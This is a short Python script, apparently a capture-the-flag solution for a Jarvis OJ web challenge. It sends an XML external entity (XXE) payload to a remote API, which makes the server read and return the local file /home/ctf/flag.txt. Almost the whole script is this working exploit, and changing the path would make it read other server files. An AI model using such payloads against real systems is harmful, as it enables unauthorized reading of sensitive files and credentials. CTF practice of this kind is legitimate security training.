import requests

url='http://web.jarvisoj.com:9882/api/v1.0/try'
flag = "123"
payload={
    "search":flag,
    "value":"own"
}
ss = requests.session()
headers = {
    "Content-Type":"application/xml"
}
payloads = '<?xml version="1.0" ?>\
    <!DOCTYPE a [\
    <!ENTITY b SYSTEM "file:///home/ctf/flag.txt">]>\
    <a>&b;</a>'
res = ss.post(url,data=payloads,headers=headers)
print(res.content)
